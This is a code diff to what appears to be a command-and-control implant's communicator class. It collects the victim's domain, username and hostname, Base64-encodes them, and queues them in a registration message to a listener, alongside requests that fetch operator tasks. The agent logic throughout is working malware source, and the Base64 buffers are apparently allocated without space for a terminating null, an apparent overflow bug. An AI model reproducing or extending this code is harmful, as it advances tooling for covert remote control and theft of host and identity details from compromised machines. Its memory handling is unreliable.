@@ -34,39 +34,78 @@ void BaseCommunicator::QueueRegistrationDataAsFirstAgentOutput()
         STRING_AGENT_REGISTER_LEN,
         strAgentRegister);
 
-    // Get logged-in username and hostname of computer
-    LPVOID pUsername = this->pWinApiCustom->GetUserNameCustom();
-    LPVOID pFqdnComputer = this->pWinApiCustom->GetFQDNComputer();
-    if (pUsername == NULL || pFqdnComputer == NULL)
+    // Buffer variables
+    LPVOID pUserName = NULL;
+    LPVOID pDomainName = NULL;
+    LPVOID pFqdnComputer = NULL;
+    LPVOID pFqdnComputerB64 = NULL;
+    LPVOID pDomainAndUserNameB64 = NULL;
+    LPVOID pDomainAndUserName = NULL;
+
+    // Get logged-in username and hostname of computer, then concat them
+    this->pWinApiCustom->GetUserNameCustom(&pUserName, &pDomainName);
+    pFqdnComputer = this->pWinApiCustom->GetFQDNComputer();
+    if (pUserName == NULL || pDomainName == NULL || pFqdnComputer == NULL)
         goto CLEANUP;
-    DWORD usernameLen = StrLen((PCHAR)pUsername);
+    DWORD domainNameLen = StrLen((PCHAR)pDomainName);
+    DWORD userNameLen = StrLen((PCHAR)pUserName);
     DWORD fqdnComputerLen = StrLen((PCHAR)pFqdnComputer);
 
+    pDomainAndUserName = this->pWinApiCustom->HeapAllocCustom(domainNameLen + 1 + userNameLen + 1); // "DOMAIN/USERNAME" + null-byte
+    if (pDomainAndUserName == NULL)
+        goto CLEANUP;
+    ConcatString((PCHAR)pDomainAndUserName, (PCHAR)pDomainName);
+    ConcatString((PCHAR)pDomainAndUserName, "/");
+    ConcatString((PCHAR)pDomainAndUserName, (PCHAR)pUserName);
+    DWORD domainAndUserNameLen = StrLen((PCHAR)pDomainAndUserName);
+
+    // Convert all necessary individual data into Base64
+    DWORD fqdnComputerB64Len = (((fqdnComputerLen + 2) / 3) * 4);
+    DWORD domainAndUserNameB64Len = (((domainAndUserNameLen + 2) / 3) * 4);
+    pFqdnComputerB64 = this->pWinApiCustom->HeapAllocCustom(fqdnComputerB64Len);
+    pDomainAndUserNameB64 = this->pWinApiCustom->HeapAllocCustom(domainAndUserNameB64Len);
+    if (pFqdnComputerB64 == NULL || pDomainAndUserNameB64 == NULL)
+        goto CLEANUP;
+    Base64Encode((PUCHAR)pFqdnComputer, fqdnComputerLen, (PCHAR)pFqdnComputerB64);
+    Base64Encode((PUCHAR)pDomainAndUserName, domainAndUserNameLen, (PCHAR)pDomainAndUserNameB64);
+
     // Prepare registration data
-    DWORD registrationDataSize = STRING_AGENT_REGISTER_LEN + 1 + 6 + 1 + fqdnComputerLen + 1 + usernameLen + 1; // "AGENT_REGISTER" + "-" + "6 char agent id" + "-" + "HOSTNAME" + "-" + "USERNAME" + "null-byte"
+    DWORD registrationDataSize = STRING_AGENT_REGISTER_LEN + 1 + StrLen(this->agentId) + 1 + fqdnComputerB64Len + 1 + domainAndUserNameB64Len + 1; // "AGENT_REGISTER" + "-" + "6 char agent id" + "-" + "HOSTNAME B64" + "-" + "DOMAIN/USERNAME B64" + "null-byte"
     LPVOID pRegistrationData = this->pWinApiCustom->HeapAllocCustom(registrationDataSize);
     if (pRegistrationData == NULL)
-        return;
+        goto CLEANUP;
 
-    CopyBuffer(pRegistrationData, strAgentRegister, STRING_AGENT_REGISTER_LEN);                                                     // "AGENT_REGISTER"
-    CopyBuffer((PBYTE)pRegistrationData + STRING_AGENT_REGISTER_LEN, "-", 1);                                                       // "-"
-    CopyBuffer((PBYTE)pRegistrationData + STRING_AGENT_REGISTER_LEN + 1, this->agentId, 6);                                         // Agent Id
-    CopyBuffer((PBYTE)pRegistrationData + STRING_AGENT_REGISTER_LEN + 1 + 6, "-", 1);                                               // "-"
-    CopyBuffer((PBYTE)pRegistrationData + STRING_AGENT_REGISTER_LEN + 1 + 6 + 1, pFqdnComputer, fqdnComputerLen);                   // "HOSTNAME"
-    CopyBuffer((PBYTE)pRegistrationData + STRING_AGENT_REGISTER_LEN + 1 + 6 + 1 + fqdnComputerLen, "-", 1);                         // "-"
-    CopyBuffer((PBYTE)pRegistrationData + STRING_AGENT_REGISTER_LEN + 1 + 6 + 1 + fqdnComputerLen + 1, pUsername, usernameLen + 1); // "USERNAME" + null-terminating byte
+    ConcatString((PCHAR)pRegistrationData, strAgentRegister);            // "AGENT_REGISTER"
+    ConcatString((PCHAR)pRegistrationData, "-");                         // "-"
+    ConcatString((PCHAR)pRegistrationData, this->agentId);               // Agent Id
+    ConcatString((PCHAR)pRegistrationData, "-");                         // "-"
+    ConcatString((PCHAR)pRegistrationData, (PCHAR)pFqdnComputerB64);     // "HOSTNAME B64"
+    ConcatString((PCHAR)pRegistrationData, "-");                         // "-"
+    ConcatString((PCHAR)pRegistrationData, (PCHAR)pDomainAndUserNameB64); // "DOMAIN/USERNAME B64"
 
     if (!this->pTaskOutputQueue->AcquireThreadMutex())
-        return;
+        goto CLEANUP;
     this->pTaskOutputQueue->Enqueue(pRegistrationData);
     this->pTaskOutputQueue->ReleaseThreadMutex();
 
 CLEANUP:
-    if (pUsername != NULL)
-        this->pWinApiCustom->HeapFreeCustom(pUsername);
+    if (pUserName != NULL)
+        this->pWinApiCustom->HeapFreeCustom(pUserName);
+
+    if (pDomainName != NULL)
+        this->pWinApiCustom->HeapFreeCustom(pDomainName);
 
     if (pFqdnComputer != NULL)
         this->pWinApiCustom->HeapFreeCustom(pFqdnComputer);
+
+    if (pFqdnComputerB64 != NULL)
+        this->pWinApiCustom->HeapFreeCustom(pFqdnComputerB64);
+
+    if (pDomainAndUserNameB64 != NULL)
+        this->pWinApiCustom->HeapFreeCustom(pDomainAndUserNameB64);
+
+    if (pDomainAndUserName != NULL)
+        this->pWinApiCustom->HeapFreeCustom(pDomainAndUserName);
 }
 
 /* Verify if Agent registration was successful */
@@ -90,14 +129,14 @@ BOOL BaseCommunicator::IsAgentRegistrationSuccessful()
         STRING_REGISTERED_LEN,
         strRegistered);
 
-    DWORD registrationResponseCorrectSize = STRING_REGISTERED_LEN + 1 + 6 + 1; // "REGISTERED" + "-" + "6 char agent id" + "null-byte"
+    DWORD registrationResponseCorrectSize = STRING_REGISTERED_LEN + 1 + StrLen(this->agentId) + 1; // "REGISTERED" + "-" + "6 char agent id" + "null-byte"
     pRegistrationResponseCorrect = this->pWinApiCustom->HeapAllocCustom(registrationResponseCorrectSize);
     if (pRegistrationResponseCorrect == NULL)
         goto CLEANUP;
 
-    CopyBuffer(pRegistrationResponseCorrect, strRegistered, STRING_REGISTERED_LEN);
-    CopyBuffer((PBYTE)pRegistrationResponseCorrect + STRING_REGISTERED_LEN, "-", 1);
-    CopyBuffer((PBYTE)pRegistrationResponseCorrect + STRING_REGISTERED_LEN + 1, this->agentId, 6 + 1); // Agent Id + Agent Id's null terminator
+    ConcatString((PCHAR)pRegistrationResponseCorrect, strRegistered);
+    ConcatString((PCHAR)pRegistrationResponseCorrect, "-");
+    ConcatString((PCHAR)pRegistrationResponseCorrect, this->agentId);
 
     for (int i = 0; i < this->pTaskInputQueue->GetSize(); i++)
     {
@@ -175,9 +214,9 @@ void BaseCommunicator::PrepareDataForCommunicateOnceWithListener(BOOL forRegistr
     if (pGetTasks == NULL)
         goto CLEANUP;
 
-    CopyBuffer(pGetTasks, strGetTasks, STRING_GET_TASKS_LEN);
-    CopyBuffer((PBYTE)pGetTasks + STRING_GET_TASKS_LEN, "-", 1);
-    CopyBuffer((PBYTE)pGetTasks + STRING_GET_TASKS_LEN + 1, this->agentId, 6 + 1); // Agent Id + Agent Id's null terminator
+    ConcatString((PCHAR)pGetTasks, strGetTasks);
+    ConcatString((PCHAR)pGetTasks, "-");
+    ConcatString((PCHAR)pGetTasks, this->agentId);
 
     if (!forRegistration)
         this->communicateWithListenerDataSize += StrLen((PCHAR)pGetTasks) + 1; // Len of string + 1 null-separator
@@ -219,7 +258,7 @@ void BaseCommunicator::PrepareDataForCommunicateOnceWithListener(BOOL forRegistr
             LPVOID taskOutputData = this->pTaskOutputQueue->Dequeue();
 
             sizeOfTaskOutput = StrLen((PCHAR)taskOutputData) + 1;
-            CopyBuffer((PCHAR)pCommunicateWithListenerData + bytesNumCopied, taskOutputData, sizeOfTaskOutput);
+            CopyBuffer((PCHAR)(this->pCommunicateWithListenerData) + bytesNumCopied, taskOutputData, sizeOfTaskOutput);
             bytesNumCopied += sizeOfTaskOutput;
 
             this->pWinApiCustom->HeapFreeCustom(taskOutputData);
